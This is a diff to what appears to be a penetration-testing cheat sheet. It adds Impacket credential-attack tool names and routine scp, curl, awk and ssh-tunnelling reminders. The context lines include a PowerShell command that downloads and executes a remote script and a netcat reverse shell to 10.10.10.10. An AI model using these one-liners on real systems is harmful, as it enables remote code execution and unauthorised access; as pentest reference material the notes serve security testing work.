@@ -492,6 +492,7 @@ and [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc
 - Others  
 
 [Impacket](https://github.com/SecureAuthCorp/impacket)  
+with GetUserSPNs, psexec, smbserver, GetNPUsers, secretsdump
 [SecLists](https://github.com/danielmiessler/SecLists)  
 [Nishang](https://github.com/samratashok/nishang)  
 
@@ -668,4 +669,45 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Inv
 
 ```
 nc 10.10.10.10 1337 -e /bin/bash
+```
+
+### Reminders
+
+- scp  
+
+Copy file from local to remote :  
+```
+scp file.txt $REMOTE_USER@REMOTE_SERVER:/remote/path/
+```
+
+Copy file from remote to local :  
+```
+scp $REMOTE_USER@$REMOTE_SERVER:/remote/path/file.txt file.txt
+```
+
+- curl  
+
+Useful options :  
+-X : request command  
+-H : header  
+-d : data, specify @file.txt to upload file  
+--insecure : ignore certificate validity  
+-v : verbose  
+
+- awk  
+
+Print only first column :  
+```
+awk '{print $1}'
+```
+
+- sort  
+
+-u : remove duplicates  
+
+- ssh tunneling  
+
+Forward port 1234 of remote machine to port 5678 of local machine :  
+```
+ssh -L 1234:127.0.0.1:5678 user@remote
 ```
